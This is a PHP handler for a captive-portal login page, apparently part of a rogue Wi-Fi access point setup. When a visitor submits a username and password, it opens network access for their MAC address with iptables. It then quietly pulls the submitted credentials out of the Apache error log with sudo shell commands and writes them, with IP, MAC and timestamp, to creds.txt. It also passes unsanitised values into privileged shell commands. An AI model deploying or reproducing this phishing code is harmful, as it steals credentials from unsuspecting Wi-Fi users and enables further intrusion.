<!DOCTYPE html>
<html>
<body>
<?php
date_default_timezone_set('Australia/Melbourne');
$date = date('m/d/Y h:i:s a', time());

//modify the below accordingly - also give www-data appropriate permissions
if (isset($_POST['visitor_accept_terms']) AND !(empty($_POST['user'])) AND !(empty($_POST['password']))){
	$ip = $_SERVER['REMOTE_ADDR'];
	$mac = shell_exec("sudo /usr/sbin/arp -an " . $ip);
	preg_match('/..:..:..:..:..:../',$mac , $matches);
	$mac = @$matches[0];
	$res=shell_exec("/usr/bin/sudo iptables -I captiveportal 1 -t mangle -m mac --mac-source $mac -j RETURN 2>&1");
	echo "You have successful logged in. <br>Redirecting......";
	sleep(10);
	echo '<script type="text/javascript"> window.location = "http://www.google.com/" </script>';

	$myfile = fopen("creds.txt", "a") or die("unable to open file!");
	$user = shell_exec("sudo cat /var/log/apache2/error.log | grep user | tail -1 | cut -f 14 -d \& | cut -f 2 -d \= | tr -d '\n'");
	$password = shell_exec("sudo cat /var/log/apache2/error.log | grep user | tail -1 | cut -f 15 -d \& | cut -f 2 -d \= ");
	$line = $date . " | " . $ip . " | " . $mac . " | " . $user . " | " . $password;
	fwrite($myfile, $line);
	fclose($myfile);
}

else {
	echo "Please submit a valid username and password <br> Redirecting back to login page....";
	sleep(10);
	echo '<script type="text/javascript"> window.location = "http://10.0.0.1/index.php" </script>';
}
	
?>

</body>
</html>
